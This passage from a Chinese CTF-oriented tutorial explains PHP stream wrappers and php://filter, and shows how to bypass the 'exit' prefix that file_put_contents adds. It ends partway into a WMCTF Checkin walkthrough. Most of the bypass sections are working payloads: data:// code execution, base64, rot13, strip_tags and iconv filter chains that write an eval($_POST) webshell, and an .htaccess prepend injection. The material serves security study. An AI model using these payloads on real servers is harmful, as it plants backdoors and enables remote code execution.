src="https://i.loli.net/2021/07/09/jnh978rKFzs2Aty.png" alt="image-20210406175509225"></p></li><li><p><strong>compress.bzip2://file.bz2</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</span></span><br><span class="line">?path=compress.bzip2://D:\phpStudy_pro\WWW\learn\phpinfo.bz2</span><br></pre></td></tr></table></figure></li><li><p><strong>compress.zlib://file.gz</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</span></span><br><span class="line">?path=compress.zlib://D:\phpStudy_pro\WWW\learn\phpinfo.gz</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-7-data-协议"><a href="#2-7-data-协议" class="headerlink" title="2.7 data:// 协议"></a>2.7 data:// 协议</h3><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p><p><strong>用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure><ul><li><p><strong>data://text/plain,</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210406174950182.png" alt="image-20210406174950182"></p></li><li><p><strong>data://text/plain;base64,</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?path=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line">PD9waHAKc3lzdGVtKCdscycpOwo/Pg==</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://i.loli.net/2021/07/09/HhltIN7J9uqwSRy.png" alt="image-20210406174926802"></p><h3 id="2-8-http-https-协议"><a href="#2-8-http-https-协议" class="headerlink" title="2.8 http://  https:// 协议"></a>2.8 http://  https:// 协议</h3><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p><p><strong>用法</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><h3 id="2-9-phar-协议"><a href="#2-9-phar-协议" class="headerlink" title="2.9 phar:// 协议"></a>2.9 phar:// 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?path=phar://D:\phpStudy_pro\WWW\learn\phpinfo.zip\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/mWY79sd3OtbCzur.png" alt="image-20210406175302449"></p><h3 id="2-10-扩展：phar-协议对象注入技术"><a href="#2-10-扩展：phar-协议对象注入技术" class="headerlink" title="2.10 扩展：phar://协议对象注入技术"></a>2.10 扩展：<strong>phar://协议对象注入技术</strong></h3><p><a href="https://paper.seebug.org/680/">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p><h2 id="三、PHP过滤器"><a href="#三、PHP过滤器" class="headerlink" title="三、PHP过滤器"></a>三、PHP过滤器</h2><p><a href="https://www.php.net/manual/zh/filters.string.php">PHP过滤器</a></p><h3 id="3-1-字符串过滤器"><a href="#3-1-字符串过滤器" class="headerlink" title="3.1 字符串过滤器"></a>3.1 字符串过滤器</h3><ul><li><p><strong>string.rot13</strong>：自 PHP 4.3.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.str-rot13.php">str_rot13()</a>函数处理所有的流数据</p></li><li><p><strong>string.toupper</strong>：自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtoupper.php">strtoupper()</a>函数处理所有的流数据</p><p>转换为大写</p></li><li><p><strong>string.tolower</strong>：自 PHP 5.0.0 起）使用此过滤器等同于用 <a href="https://www.php.net/manual/zh/function.strtolower.php">strtolower()</a>函数处理所有的流数据</p><p>转换为小写</p></li><li><p><strong>string.strip_tags</strong></p><ul><li><p>等同于用  <a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a>函数处理所有的流数据</p><p>可以用两种格式接收参数：一种是和     <a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a>函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。   </p></li><li><p>**strip_tags ( string <code>$str</code>   , string <code>$allowable_tags</code> = ?   ) **：从字符串中去除 HTML 和 PHP 标记</p></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">str  </span><br><span class="line">    输入字符串。</span><br><span class="line">allowable_tags</span><br><span class="line">    使用可选的第二个参数指定不被去除的字符列表。</span><br><span class="line">注意:</span><br><span class="line">HTML 注释和 PHP 标签也会被去除。这里是硬编码处理的</span><br></pre></td></tr></table></figure><h3 id="3-2-转换过滤器"><a href="#3-2-转换过滤器" class="headerlink" title="3.2 转换过滤器"></a>3.2 转换过滤器</h3><p><a href="https://www.php.net/manual/zh/filters.convert.php">转换过滤器</a></p><p>如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。</p><ul><li><p><strong>convert.base64-encode &amp; convert.base64-decode</strong></p><ul><li><p><code>convert.base64-encode</code>和     <code>convert.base64-decode</code>使用这两个过滤器等同于分别用     <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>和     <a href="https://www.php.net/manual/zh/function.base64-decode.php">base64_decode()</a>函数处理所有的流数据。</p></li><li><p>​    <code>convert.base64-encode</code>支持以一个关联数组给出的参数。如果给出了     <code>line-length</code>，base64 输出将被用     <code>line-length</code>个字符为 长度而截成块。如果给出了     <code>line-break-chars</code>，每块将被用给出的字符隔开。这些参数的效果和用     <a href="https://www.php.net/manual/zh/function.base64-encode.php">base64_encode()</a>再加上     <a href="https://www.php.net/manual/zh/function.chunk-split.php">chunk_split()</a>相同。</p></li></ul></li><li><p><strong>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</strong></p><ul><li><p><code>convert.quoted-printable-encode</code>和     <code>convert.quoted-printable-decode</code>使用此过滤器的 decode 版本等同于用     <a href="https://www.php.net/manual/zh/function.quoted-printable-decode.php">quoted_printable_decode()</a>函数处理所有的流数据。</p></li><li><p>没有和     <code>convert.quoted-printable-encode</code>相对应的函数。    <code>convert.quoted-printable-encode</code>支持以一个关联数组给出的参数。除了支持和     <code>convert.base64-encode</code>一样的附加参数外，    <code>convert.quoted-printable-encode</code>还支持布尔参数     <code>binary</code>和     <code>force-encode-first</code>。    <code>convert.base64-decode</code>只支持     <code>line-break-chars</code>参数作为从编码载荷中剥离的类型提示。</p></li></ul></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]; </span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]; </span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>**convert.iconv.***：过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用 <a href="https://www.php.net/manual/zh/function.iconv.php">iconv()函数</a> 处理所有的流数据。</p><ul><li><p><strong>使用：</strong>将字符串从<input-encoding>编码方式转换为<output-encoding> 编码方式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line"><span class="keyword">or</span> </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure><p><strong>支持的编码方式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">UCS-<span class="number">4</span>*</span><br><span class="line">UCS-<span class="number">4</span>BE</span><br><span class="line">UCS-<span class="number">4</span>LE*</span><br><span class="line">UCS-<span class="number">2</span></span><br><span class="line">UCS-<span class="number">2</span>BE</span><br><span class="line">UCS-<span class="number">2</span>LE</span><br><span class="line">UTF-<span class="number">32</span>*</span><br><span class="line">UTF-<span class="number">32</span>BE*</span><br><span class="line">UTF-<span class="number">32</span>LE*</span><br><span class="line">UTF-<span class="number">16</span>*</span><br><span class="line">UTF-<span class="number">16</span>BE*</span><br><span class="line">UTF-<span class="number">16</span>LE*</span><br><span class="line">UTF-<span class="number">7</span></span><br><span class="line">UTF7-IMAP</span><br><span class="line">UTF-<span class="number">8</span>*</span><br><span class="line">ASCII*</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="3-3-压缩过滤器"><a href="#3-3-压缩过滤器" class="headerlink" title="3.3 压缩过滤器"></a>3.3 压缩过滤器</h3><p><a href="https://www.php.net/manual/zh/filters.compression.php">压缩过滤器</a></p><ul><li><p><strong>使用 zlib.deflate 压缩：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate/resource=flag.php</span></span><br></pre></td></tr></table></figure></li><li><p><strong>使用 inflate 解压：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate|zlib.inflate/resource=flag.php</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p><strong>bzip2.compress 和 bzip2.decompress 与上同</strong></p></li></ul><h3 id="3-4-加密过滤器"><a href="#3-4-加密过滤器" class="headerlink" title="3.4 加密过滤器"></a>3.4 加密过滤器</h3><p><a href="https://www.php.net/manual/zh/filters.encryption.php">加密过滤器</a></p><ul><li><p><em><em>mcrypt.</em>  和 mdecrypt.</em>**</p><p><code>mcrypt.*</code>和     <code>mdecrypt.*</code>使用 libmcrypt 提供了对称的加密和解密。这两组过滤器都支持     <a href="https://www.php.net/manual/zh/ref.mcrypt.php">mcrypt 扩展库</a>中相同的算法，格式为     <code>mcrypt.ciphername</code>，其中     <code>ciphername</code>是密码的名字，将被传递给     <a href="https://www.php.net/manual/zh/function.mcrypt-module-open.php">mcrypt_module_open()</a>。有以下五个过滤器参数可用：</p><p><img src="https://i.loli.net/2021/07/09/6Igj8MbPSOqHVcK.png" alt="image-20210406165716456"></p></li></ul><p><strong>short_open_tag</strong>：php.ini 当中的该配置为 On，意味着可以使用 <strong>短标签</strong>，将 <code>&lt;?php ?&gt;</code> 替换为 <code>&lt;? ?&gt;</code> ，并且在该种情况下，<code>&lt;?=</code> 表示 <code>&lt;? echo</code></p><h2 id="四、实战之死亡绕过"><a href="#四、实战之死亡绕过" class="headerlink" title="四、实战之死亡绕过"></a>四、实战之死亡绕过</h2><h2 id="4-1-bypass不同变量"><a href="#4-1-bypass不同变量" class="headerlink" title="4.1 bypass不同变量"></a>4.1 bypass不同变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=$_GET[&#x27;filename&#x27;];</span><br><span class="line">$content=$_GET[&#x27;content&#x27;];</span><br><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure><p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上if(!defined(xxx))exit;之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？</p><p>思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。</p><p>这里的$_GET[‘filename’]是可以控制协议的.</p><h4 id="4-1-1-base64绕过"><a href="#4-1-1-base64绕过" class="headerlink" title="4.1.1 base64绕过"></a>4.1.1 base64绕过</h4><p>base64原理请看<a href="https://www.cnblogs.com/chengmo/archive/2014/05/18/3735917.html">这里</a></p><p><strong>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</strong></p><p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p><p>当$content被加上了<?php exit; ?>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符&lt; ? ; &gt; 空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</p><p>由于，”phpexit”一共7个字符，但是base64算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的phpexit加上另一个字符就会被base64解码，然后后边的我们精心构造的base64字符串也会被成功解码为php代码。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/write=convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br></pre></td></tr></table></figure><p>成功写入</p><p><img src="https://i.loli.net/2021/07/09/of7ZjisRahGvUQN.png" alt="0KD2se.png"></p><h4 id="4-1-2-rot13绕过"><a href="#4-1-2-rot13绕过" class="headerlink" title="4.1.2 rot13绕过"></a>4.1.2 rot13绕过</h4><ul><li>str_rot13()</li></ul><blockquote><p>str_rot13() 函数对字符串执行 ROT13 编码。<br>ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。数字和非字母字符保持不变。<br>编码和解码都是由相同的函数完成的。如果您把一个已编码的字符串作为参数，那么将返回原始字符串。</p></blockquote><p>利用php://filter中string.rot13过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除exit。 <code>&lt;?php exit;</code> 在经过rot13编码后会变成 <code>&lt;?cuc rkvg();</code> ，不过这种利用手法的前提是PHP不开启short_open_tag。</p><p><a href="https://www.php.net/manual/zh/ini.core.php">https://www.php.net/manual/zh/ini.core.php</a></p><p><img src="https://i.loli.net/2021/07/09/H9db8JpDP2QEOvu.png" alt="0KsCtI.png"></p><p>虽然官方说的默认开启，但是在php.ini中默认是注释掉的，也就是说它还是默认关闭。但是我本地 phpstudy 是开启的，导致执行payload后：</p><pre><code>Parse error: syntax error, unexpected &#39;rkvg&#39; (T_STRING) in E:\phpstudy_pro\WWW\1\2.php on line 1</code></pre><p><code>&lt;?php eval($_POST[a]);</code> rot13编码后 <code>&lt;?cuc riny($_CBFG[n]);</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]);</span><br></pre></td></tr></table></figure><p>成功写入文件 2.php</p><pre><code>&lt;?cuc rkvg();&lt;?php eval($_POST[a]);</code></pre><p>在关闭 <code>short_open_tag = Off</code> 的情况下，可以</p><p>成功执行命令</p><h4 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h4><ul><li>strip_tags — 从字符串中去除 HTML 和 PHP 标记。该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数 fgetss() 一样的机制去除标记。 </li></ul><p><img src="https://i.loli.net/2021/07/09/D1S5O4rGiBEYWdm.png" alt="0KsHbQ.png"></p><p>但是我们的目的是写入webshell，如果那样的话，我们的webshell岂不是同样起不了作用，不过我们可以使用多个过滤器进行绕过这个限制（php://filter允许通过 | 使用多个过滤器）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、webshell用base64编码   //为了避免strip_tags的影响</span><br><span class="line"></span><br><span class="line">2、调用string.strip_tags //这一步将去除&lt;?php exit; ?&gt;</span><br><span class="line"></span><br><span class="line">3、调用convert.base64-decode //这一步将还原base64编码的webshell</span><br></pre></td></tr></table></figure><p>payload:</p><pre><code>?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></pre><p>成功写入：</p><pre><code>&lt;?php eval($_POST[a]);</code></pre><h2 id="htaccess的预包含利用"><a href="#htaccess的预包含利用" class="headerlink" title=".htaccess的预包含利用"></a>.htaccess的预包含利用</h2><p>PHP中auto_prepend_file与auto_append_file用法实例分析:  <a href="https://www.jb51.net/article/55468.htm">https://www.jb51.net/article/55468.htm</a></p><p>payload</p><pre><code>?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?&gt;php_value auto_prepend_file%20&quot;/flag&quot;</code></pre><h2 id="4-2-bypass相同变量"><a href="#4-2-bypass相同变量" class="headerlink" title="4.2 bypass相同变量"></a>4.2 bypass相同变量</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content = $_GET[content];</span><br><span class="line">file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br></pre></td></tr></table></figure><p>这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容exit这个关键代码写入shell后门。</p><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><p>构造：</p><pre><code>content=php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php或content=php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code></pre><p>进行拼接之后就是 <code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code> 然后会对其进行一次整体的 <code>base64-decode</code> 。从而分解掉死亡代码，</p><p>但是无法生成content；虽然文件创建成功，但是就是无法生成content。问题在于resource 后边的  <code>=</code>；</p><p>‘=’在base64中的作用是填充，也就是以为着结束；在‘=’的后面是不允许有任何其他字符的否则会报错，</p><p><img src="https://i.loli.net/2021/07/09/XKRvMNHoj3O6uUI.png" alt="0KR52n.png"></p><p><img src="https://i.loli.net/2021/07/09/WfYKHRlA34pvgC5.png" alt="0KR7rV.png"></p><p>这里因为是由于‘=’从而使得我们写入content不成功，那么我们可以想个方法去掉等号即可，</p><h4 id="去掉等号之过滤器嵌套base64"><a href="#去掉等号之过滤器嵌套base64" class="headerlink" title="去掉等号之过滤器嵌套base64"></a>去掉等号之过滤器嵌套base64</h4><p>payload:</p><pre><code>content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B.php</code></pre><p><img src="https://i.loli.net/2021/07/09/b1GaUcvByfNrDA5.png" alt="0KI8vd.png"></p><p>发现可以生成文件，并且可以看到我们已经成功写入了shell；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p><p>payoad:</p><pre><code>content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php</code></pre><p>我们将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成shell.php文件；从而就可以生成正常的文件名.</p><h4 id="去掉等号之直接对内容进行变性另类base64"><a href="#去掉等号之直接对内容进行变性另类base64" class="headerlink" title="去掉等号之直接对内容进行变性另类base64"></a>去掉等号之直接对内容进行变性另类base64</h4><p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的html标签，从而对剩下的内容进行base64解码。但是这种方法却不是如此，payload如下：</p><pre><code>php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../shell.php</code></pre><p>这种payload的攻击原理即是首先直接在内容时，就将我们base64遇到的‘=’这个问题直接写在<? ?>中进行过滤掉，然后base64-decode再对原本内容的&lt;?php exit();进行转码，从而达到分解死亡代码的效果</p><h4 id="rot13-绕过"><a href="#rot13-绕过" class="headerlink" title="rot13 绕过"></a>rot13 绕过</h4><p>尽管base64比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可；</p><p>payload</p><pre><code>content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.phpcontent=php://filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php</code></pre><p>生成文件内容：</p><pre><code>&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.ebg13|&lt;?php phpinfo();?&gt;|/erfbhepr=f1zcyr.cuc</code></pre><p>其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；</p><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><p>对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除，而我们的恶意代码正常解码存储。</p><ul><li><strong>usc-2</strong></li></ul><p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#x27;&lt;?php @eval($_POST[ab]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure><p>payload:</p><pre><code>php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?/resource=shell.php</code></pre><p>成功向 <code>shell.php</code> 写入</p><pre><code>?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E&lt;?php @eval($_POST[ab]);?&gt;r/seuocr=ehsle.lhp</code></pre><h4 id="usc-4"><a href="#usc-4" class="headerlink" title="usc-4"></a><strong>usc-4</strong></h4><p>通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#x27;&lt;?php @eval($_POST[abcd]);?&gt;&#x27;);</span><br></pre></td></tr></table></figure><p>28字符 <code>&lt;?php @eval($_POST[abcd]);?&gt;</code> 转为 <code>hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)</code></p><p>payload:</p><pre><code>content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)/resource=shell.php</code></pre><p>成功写入：</p><pre><code>hp?&lt;xe p)(tiphp;f//:etlioc/rrevnci.t.vno-SCU.EL4-SCU|EB4&lt;?php @eval($_POST[abcd]);?&gt;ser/cruohs=e.lle</code></pre><h4 id="utf8-utf7"><a href="#utf8-utf7" class="headerlink" title="utf8-utf7"></a>utf8-utf7</h4><p><img src="https://i.loli.net/2021/07/09/86RdHVha2ITFbUC.png" alt="0KxBGR.png"></p><p>这里发现生成的是+AD0-,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell.</p><p>Payload:</p><pre><code>content=php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</code></pre><p>ps：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 这里要符合base64 解码按4 字节进行</span><br><span class="line"></span><br><span class="line">utf8 -&gt; utf-7</span><br><span class="line"></span><br><span class="line">&lt;?php exit();php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php</span><br><span class="line"></span><br><span class="line">变为：</span><br><span class="line"></span><br><span class="line">+ADw?php exit()+ADs-php://filter/write+AD0-aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+-+AHw-convert.iconv.utf-8.utf-7+AHw-convert.base64-decode/resource+AD0-shell.php</span><br><span class="line"></span><br><span class="line">base64恶意payload的之前正好36个字节，所以写入了shell</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/07/09/SGynd3KZeObiRPA.png" alt="0KzrkQ.png"></p><h2 id="五、WMCTF-Checkin"><a href="#五、WMCTF-Checkin" class="headerlink" title="五、WMCTF Checkin"></a>五、WMCTF Checkin</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//PHP 7.0.33 Apache/2.4.25</span><br><span class="line">error_reporting(0);</span><br><span class="line">$sandbox = &#x27;/var/www/html/&#x27; . md5($_SERVER[&#x27;HTTP_X_REAL_IP&#x27;]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(isset($_GET[&#x27;content&#x27;])) &#123;</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if(preg_match(&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;,$content))</span><br><span class="line">         die(&#x27;hacker&#x27;);</span><br><span class="line">    if(file_exists($content))</span><br><span class="line">        require_once($content);</span><br><span class="line">    echo $content;</span><br><span class="line">    file_put_contents($content,&#x27;&lt;?php exit();&#x27;.$content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>死亡exit的绕过</p><h4 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h4><p>查看伪协议处理的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 